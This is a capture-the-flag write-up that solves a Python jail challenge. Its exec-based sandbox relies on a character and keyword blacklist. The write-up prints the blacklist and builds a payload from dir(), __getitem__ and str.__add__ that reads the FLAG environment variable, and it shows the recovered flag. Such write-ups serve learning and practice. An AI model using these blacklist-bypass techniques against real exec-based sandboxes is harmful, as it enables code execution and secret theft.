# Stressful Reader

## Description

I want to read an env variable, but I'm getting stressed out because of that blacklist!!! Would you help me plz? :(

`nc misc.snakectf.org 1700`

Download: [jail.py](https://2023.snakectf.org/files/894de1d49cf2479c23b4c977c30ddda5/jail.py?token=eyJ1c2VyX2lkIjozOTYsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjMzM30.ZXcalA.9nQViELBJ-gITtN4YfYvXl2ElmI)

Source: 

::: details jail.py
```py
#!/usr/bin/env python3
import os

banner = r"""
 _____ _                      __       _                       _
/  ___| |                    / _|     | |                     | |
\ `--.| |_ _ __ ___  ___ ___| |_ _   _| |   _ __ ___  __ _  __| | ___ _ __
 `--. \ __| '__/ _ \/ __/ __|  _| | | | |  | '__/ _ \/ _` |/ _` |/ _ \ '__|
/\__/ / |_| | |  __/\__ \__ \ | | |_| | |  | | |  __/ (_| | (_| |  __/ |
\____/ \__|_|  \___||___/___/_|  \__,_|_|  |_|  \___|\__,_|\__,_|\___|_|

"""


class Jail():
    def __init__(self) -> None:
        print(banner)
        print()
        print()
        print("Will you be able to read the $FLAG?")
        print("> ",end="")


        self.F = ""
        self.L = ""
        self.A = ""
        self.G = ""
        self.run_code(input())
        pass

    def run_code(self, code):

        badchars = [ 'c', 'h', 'j', 'k', 'n', 'o', 'p', 'q', 'u', 'w', 'x', 'y', 'z'
                   , 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N'
                   , 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W'
                   , 'X', 'Y', 'Z', '!', '"', '#', '$', '%'
                   , '&', '\'', '-', '/', ';', '<', '=', '>', '?', '@'
                   , '[', '\\', ']', '^', '`', '{', '|', '}', '~'
                   , '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']


        badwords = ["aiter", "any", "ascii", "bin", "bool", "breakpoint"
                   , "callable", "chr", "classmethod", "compile", "dict"
                   , "enumerate", "eval", "exec", "filter", "getattr"
                   , "globals", "input", "iter", "next", "locals", "memoryview"
                   , "next", "object", "open", "print", "setattr"
                   , "staticmethod", "vars", "__import__", "bytes", "keys", "str"
                   , "join", "__dict__", "__dir__", "__getstate__", "upper"]


        if (code.isascii() and 
            all([x not in code for x in badchars]) and 
            all([x not in code for x in badwords])):

            exec(code)
        else:
            print("Exploiting detected, plz halp :/")

    def get_var(self, varname):
        print(os.getenv(varname))

if (__name__ == "__main__"):
    Jail()
```
:::


## Analysis

For more understanding of code I added following lines to checker, `debug print("anything")`:

```py
elif code.startswith('debug'):
	exec(code[6:])
```

We are given a python script with many limitation character wise. First lets determine what we can work with:

```py
import string

badchars = <snip>
badwords = <snip>

goodchars = [
    char
    for char in string.printable
    if char not in badchars
]

goodwords = [
    word
    for word in dir(__builtins__)
    if not any(badword in word for badword in badwords) and \
        not any(badchar in word for badchar in badchars)
]

print(f"{goodchars=}")
print(f"{goodwords=}")

'''
goodchars=['a', 'b', 'd', 'e', 'f', 'g', 'i', 'l', 'm', 'r', 's', 't', 'v', '(', ')', '*', '+', ',', '.', ':', '_', ' ', '\t', '\n', '\r', '\x0b', '\x0c']
goodwords=['abs', 'all', 'delattr', 'dir', 'id', 'list', 'reversed', 'set']
'''
```

Well, awfully limited methods/classes, no digits and square brackets. The goal of challenge is to get FLAG environment variable. Gracefully jail gives us `get_var` function, which gives us environment variables. The problem is we cant just pass `"FLAG"` because of blacklist.

Exploring the methods we have access to:

```py
goodwords.append('str') # While we cant use `str` class itself, we can use methods
for goodword in goodwords:
    for method in eval(f'dir({goodword})'):
        if any(badword in method for badword in badwords):
            continue
        if any(badchar in method for badchar in badchars):
            continue
        print(f'{goodword}.{method}')
```


::: details Allowed Methods
```py
abs.__delattr__
abs.__ge__
abs.__gt__
abs.__le__
abs.__lt__
abs.__self__
all.__delattr__
all.__ge__
all.__gt__
all.__le__
all.__lt__
all.__self__
delattr.__delattr__
delattr.__ge__
delattr.__gt__
delattr.__le__
delattr.__lt__
delattr.__self__
dir.__delattr__
dir.__ge__
dir.__gt__
dir.__le__
dir.__lt__
dir.__self__
id.__delattr__
id.__ge__
id.__gt__
id.__le__
id.__lt__
id.__self__
list.__add__
list.__delattr__
list.__delitem__
list.__ge__
list.__getitem__
list.__gt__
list.__iadd__
list.__le__
list.__lt__
list.__reversed__
list.__setitem__
list.reverse
reversed.__delattr__
reversed.__ge__
reversed.__gt__
reversed.__le__
reversed.__lt__
reversed.__setstate__
set.__delattr__
set.__ge__
set.__gt__
set.__le__
set.__lt__
set.add
str.__add__
str.__delattr__
str.__ge__
str.__getitem__
str.__gt__
str.__le__
str.__lt__
str.isdigit
str.istitle
str.title
```
:::


Now, how to get string FLAG? We see empty strings called `F, L, A, G` in the `__init__` and we can make use of that.

```py
> debug print(dir(self))
['A', 'F', 'G', 'L', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'get_var', 'run_code']
```

Now we need to extract the letters, but how?

After lots of testing I managed to get 0 and 1 using `all`

```
ZERO = 'all(((),))' # all with tuple that has tuples (notice the comma)
ONE  = 'all(())'    # all with empty tuple
```

Hmm.. but we can't use square brackets `[]`. `[]` is just a dunder (magic) method which uses `__getitem__` under the hood and we have access to it.

```py
> debug print(dir(self).__getitem__(0)) 
A
> debug print(dir(self).__getitem__(all(((),)))) # ZERO 
A
```

Good, we can extract items from the class, but how do we concatenate?

<!-- I swear to old and new gods one day I'll learn how to type 'concatenate' without googling! -->

Looking over the methods we can use I noticed `str.__add__` 👀 Interesting...

```py
> debug print("".__add__("Test")) 
Test
> debug print("".__add__("Test").__add__("What")) 
TestWhat
```

To be honest this was awesome discovery D: (for me)<br>
Anyways, we have a way to concat strings!

## Solution

Idea:
- Get a character (str) from class instance (self) using `dir(self)`
- Use `__add__` to add new character (concat)
- Complete flag (Use correct indexes to assemble the flag)
- Pass the completed string to `self.get_var`
- Profit

```py
ZERO = 'all(((),))'
ONE = 'all(())'

def numberify(number):
    if number == 0: return ZERO
    return '+'.join([ONE] * (number))

def values():
    return 'dir(self)'

def get_value(index):
    return f'{values()}.__getitem__({numberify(index)})'

def flag():
    return (
        get_value(1), # F
        get_value(3), # L
        get_value(0), # A
        get_value(2), # G
    )

def payload():
    f, l, a, g = flag()
    result  = f'self.get_var({f}'
    result += f'.__add__({l})'
    result += f'.__add__({a})'
    result += f'.__add__({g})'
    result += ')'
    return result

print(payload())

'''
self.get_var(dir(self).__getitem__(all(())).__add__(dir(self).__getitem__(all(())+all(())+all(()))).__add__(dir(self).__getitem__(all(((),)))).__add__(dir(self).__getitem__(all(())+all(()))))
'''
```

```py
➜ ncat misc.snakectf.org 1700

 _____ _                      __       _                       _
/  ___| |                    / _|     | |                     | |
\ `--.| |_ _ __ ___  ___ ___| |_ _   _| |   _ __ ___  __ _  __| | ___ _ __
 `--. \ __| '__/ _ \/ __/ __|  _| | | | |  | '__/ _ \/ _` |/ _` |/ _ \ '__|
/\__/ / |_| | |  __/\__ \__ \ | | |_| | |  | | |  __/ (_| | (_| |  __/ |
\____/ \__|_|  \___||___/___/_|  \__,_|_|  |_|  \___|\__,_|\__,_|\___|_|

Will you be able to read the $FLAG?
> self.get_var(dir(self).__getitem__(all(())).__add__(dir(self).__getitem__(all(())+all(())+all(()))).__add__(dir(self).__getitem__(all(((),)))).__add__(dir(self).__getitem__(all(())+all(()))))
snakeCTF{7h3_574r_d1d_7h3_j0b}
```
::: tip Flag
`snakeCTF{7h3_574r_d1d_7h3_j0b}`
:::

> The flag in humanly readable format is: `snakeCTF{ThE_STAr_dId_ThE_jOb}`, which means this is probably unintended solution D:::: info :information_source:
<br>No idea how to use `*` to profit, most likely its `unpacking` feature.
:::